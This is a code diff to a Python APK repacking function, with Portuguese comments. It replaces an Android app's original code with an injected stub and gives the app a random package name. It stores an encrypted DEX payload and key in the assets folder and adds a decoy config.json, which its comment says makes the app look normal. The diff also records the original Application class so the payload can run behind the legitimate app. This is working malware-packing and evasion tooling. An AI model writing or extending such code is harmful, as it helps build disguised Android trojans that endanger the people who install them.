@@ -181,18 +181,24 @@ def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playsto
         orig_pkg = m.group(1) if m else "com.original.app"
         new_pkg  = random_package()
 
+        # extrair Application original antes de substituir o manifest
+        ma = re.search(r'android:name="([^"]*Application[^"]*)"', raw)
+        orig_app_class = ma.group(1) if ma else "android.app.Application"
+        if orig_app_class.startswith('.'):
+            orig_app_class = orig_pkg + orig_app_class
+
         # remover smali originais, injetar stub
         for d in Path(decoded).iterdir():
             if d.name.startswith("smali"):
                 shutil.rmtree(str(d))
         shutil.copytree(str(STUB), os.path.join(decoded, "smali"))
 
-        # assets: payload criptografado
+        # assets: payload criptografado + nome da app original
         assets = os.path.join(decoded, "assets")
         os.makedirs(assets, exist_ok=True)
-        # nomes de arquivo menos suspeitos
         open(os.path.join(assets, "p.bin"), "wb").write(enc_dex)
         open(os.path.join(assets, "k.bin"), "wb").write(key_iv)
+        open(os.path.join(assets, "a.bin"), "wb").write(orig_app_class.encode("utf-8"))
         # arquivo decoy pra parecer app normal
         open(os.path.join(assets, "config.json"), "w").write(
             '{"version":1,"debug":false,"theme":"default"}')
